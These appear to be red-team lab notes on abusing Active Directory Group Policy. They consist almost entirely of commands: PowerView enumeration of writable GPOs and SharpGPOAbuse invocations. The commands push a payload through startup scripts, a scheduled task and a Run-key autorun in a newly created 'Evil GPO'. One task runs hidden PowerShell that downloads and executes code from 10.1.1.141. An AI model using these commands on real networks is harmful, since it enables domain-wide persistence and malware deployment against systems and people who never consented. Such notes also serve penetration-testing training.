# Modifying existing GPOs

```bash
# Finding GPOs
powershell Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "CreateChild|WriteProperty" -and $_.SecurityIdentifier -match "S-1-5-21-569305411-121244042-2357301523-[\d]{4,10}" }

# Resolve GPO name
powershell Get-DomainGPO -Identity "CN={5059FAC1-5E94-4361-95D3-3BB235A23928},CN=Policies,CN=System,DC=dev,DC=cyberbotic,DC=io" | select displayName, gpcFileSysPath

# Resolve SID name
powershell ConvertFrom-SID S-1-5-21-569305411-121244042-2357301523-1107

# Search OUs for which the GPO applies to
powershell Get-DomainOU -GPLink "{5059FAC1-5E94-4361-95D3-3BB235A23928}" | select distinguishedName

# Get Computers on the OUs
powershell Get-DomainComputer -SearchBase "OU=Workstations,DC=dev,DC=cyberbotic,DC=io" | select dnsHostName

# Get shares, anthing that is accessible by the current computer is fine
powershell Find-DomainShare -CheckShareAccess

# Abuse the GPO
execute-assembly C:\Tools\SharpGPOAbuse\SharpGPOAbuse\bin\Release\SharpGPOAbuse.exe --AddComputerScript --ScriptName startup.bat --ScriptContents "start /b \\dc-2\software\dns_x64.exe" --GPOName "Vulnerable GPO"
# or
execute-assembly /root/Desktop/SharpGPOAbuse.exe --AddComputerTask --TaskName "New Task" --Author EUROPA\Administrator --Command "cmd.exe" --Arguments "/c powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://10.1.1.141:80/a'))\"" --GPOName "Default Server Policy"
```

---

# Creating and Linking a GPO

```bash
# Check which group can create GPOs
powershell Get-DomainObjectAcl -Identity "CN=Policies,CN=System,DC=dev,DC=cyberbotic,DC=io" -ResolveGUIDs | ? { $_.ObjectAceType -eq "Group-Policy-Container" -and $_.ActiveDirectoryRights -contains "CreateChild" } | % { ConvertFrom-SID $_.SecurityIdentifier }

# Check if we have WriteProperty privileges
powershell Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq "GP-Link" -and $_.ActiveDirectoryRights -match "WriteProperty" } | select ObjectDN,ActiveDirectoryRights,ObjectAceType,SecurityIdentifier | fl

# Convert SID
powershell ConvertFrom-SID S-1-5-21-569305411-121244042-2357301523-1107

# List GPO Commands
powershell Get-Module -List -Name GroupPolicy | select -expand ExportedCommands

# Creating a new GPO
powershell New-GPO -Name "Evil GPO"

# Add Autorun
powershell Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "C:\Windows\System32\cmd.exe /c \\dc-2\software\dns_x64.exe" -Type ExpandString

# Link the created GPO
powershell Get-GPO -Name "Evil GPO" | New-GPLink -Target 
```
